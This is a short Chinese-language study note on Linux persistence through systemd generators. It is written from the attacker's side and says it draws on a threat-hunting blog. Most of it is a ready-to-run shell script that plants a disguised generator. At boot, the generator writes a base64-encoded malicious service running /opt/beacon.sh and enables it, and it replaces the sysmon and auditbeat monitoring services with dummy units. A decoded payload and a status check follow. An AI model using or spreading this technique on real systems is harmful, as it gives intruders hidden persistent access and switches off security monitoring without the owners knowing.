---
tags:
  - 操作系统
  - Linux
  - Systemd
参考: https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/
---
Boot or Logon Initialization Scripts: systemd-generators  

它有什么优点呢？它在引导阶段运行地非常早——在所有服务执行之前运行，因此可以避免被通过查看日志揪出来，更进一步可以篡改相关服务  

所以通过它，我们可以达成两个目标：

- 创建恶意服务  
- 篡改监视服务  

## 1. 一个例子  

**前提**：在这个位置（也就是服务中ExecStart中具体指向的位置）有我们的恶意脚本`/opt/beacon.sh`  

**我们要做的：**创建`/lib/systemd/system-generators/systemd-network-generator`这个脚本，这样我们就可以达成以下目标：  

- 创建一个服务文件`/run/systemd/system/networking.service`  
- 创建符号链接`/run/systemd/system/multi-user.target.wants/networking.service` 以激活(enable)服务  
- 创建一个 `sysmon.service` 和 `auditbeat.service` 来覆盖原服务文件  

在控制台执行以下操作：  

```shell
cat > /usr/lib/systemd/system-generators/systemd-network-generator << EOF
#! /bin/bash

# Create networking.service and enabling it to run later in the boot process
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPW5ldHdvcmtpbmcuc2VydmljZQoKW1NlcnZpY2VdCkV4ZWNTdGFydD0vb3B0L2JlYWNvbi5zaAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/system/networking.service

mkdir -p /run/systemd/system/multi-user.target.wants/
ln -s /run/systemd/system/networking.service /run/systemd/system/multi-user.target.wants/networking.service


# Create adds dummy service unit files to overwrite sysmon.service and auditbeat.service
mkdir -p /run/systemd/generator.early
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPSJTa2lwcGVkIgoKW1NlcnZpY2VdCkV4ZWNTdGFydD1lY2hvICJTa2lwcGVkIgoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/generator.early/sysmon.service
echo 'W1VuaXRdCkRlc2NyaXB0aW9uPSJTa2lwcGVkIgoKW1NlcnZpY2VdCkV4ZWNTdGFydD1lY2hvICJTa2lwcGVkIgoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0' | base64 -d > /run/systemd/generator.early/auditbeat.service
EOF

chmod +x /lib/systemd/system-generators/systemd-network-generator
```



里面的base64码翻译过来就是实际上某个`.service`文件中的内容，比如：  

`W1VuaXRdCkRlc2NyaXB0aW9uPW5ldHdvcmtpbmcuc2VydmljZQoKW1NlcnZpY2VdCkV4ZWNTdGFydD0vb3B0L2JlYWNvbi5zaAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0`就是

```shell
[Unit]
Description=networking.service

[Service]
ExecStart=/opt/beacon.sh

[Install]
WantedBy=multi-user.target
```

下次重启后，就可以运行我们的恶意服务`networking.service`了  

- 可以通过`systemctl status networking`来查看状态
